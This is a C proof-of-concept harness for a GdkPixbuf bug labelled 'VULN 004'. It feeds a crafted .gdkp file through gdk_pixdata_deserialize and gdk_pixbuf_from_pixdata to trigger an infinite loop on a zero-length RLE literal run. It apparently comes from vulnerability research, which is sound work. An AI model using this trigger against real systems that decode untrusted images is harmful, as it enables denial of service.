/*
 * vuln_004_trigger.c - PoC for GdkPixbuf VULN 004
 * Infinite Loop DoS via RLE Literal-Run Zero-Length in gdk_pixbuf_from_pixdata()
 *
 * Calls gdk_pixdata_deserialize() + gdk_pixbuf_from_pixdata() directly
 * to bypass format-detection and trigger the infinite loop.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <gdk-pixbuf/gdk-pixbuf.h>
#include <gdk-pixbuf/gdk-pixdata.h>

int main(int argc, char *argv[])
{
    const char *filename = (argc > 1) ? argv[1] : NULL;
    FILE *f;
    long fsize;
    guchar *buf;
    GdkPixdata pixdata;
    GdkPixbuf *pixbuf;
    GError *error = NULL;

    if (!filename) {
        fprintf(stderr, "Usage: %s <file.gdkp>\n", argv[0]);
        return 1;
    }

    f = fopen(filename, "rb");
    if (!f) {
        perror("fopen");
        return 1;
    }
    fseek(f, 0, SEEK_END);
    fsize = ftell(f);
    rewind(f);

    buf = (guchar *)malloc(fsize);
    if (!buf) {
        perror("malloc");
        fclose(f);
        return 1;
    }
    fread(buf, 1, fsize, f);
    fclose(f);

    fprintf(stderr, "Read %ld bytes from %s\n", fsize, filename);
    fprintf(stderr, "Calling gdk_pixdata_deserialize...\n");

    if (!gdk_pixdata_deserialize(&pixdata, (guint)fsize, buf, &error)) {
        fprintf(stderr, "gdk_pixdata_deserialize failed: %s\n",
                error ? error->message : "(no error message)");
        free(buf);
        return 1;
    }

    fprintf(stderr, "Deserialized: %dx%d type=0x%x\n",
            pixdata.width, pixdata.height, pixdata.pixdata_type);
    fprintf(stderr, "Calling gdk_pixbuf_from_pixdata (will loop forever if bug triggered)...\n");
    fflush(stderr);

    /* This call triggers the infinite loop if pixdata has a 0x00 RLE byte */
    pixbuf = gdk_pixbuf_from_pixdata(&pixdata, TRUE, &error);

    if (!pixbuf) {
        fprintf(stderr, "gdk_pixbuf_from_pixdata failed: %s\n",
                error ? error->message : "(no error message)");
        free(buf);
        return 1;
    }

    fprintf(stderr, "Completed (no infinite loop triggered)\n");
    g_object_unref(pixbuf);
    free(buf);
    return 0;
}
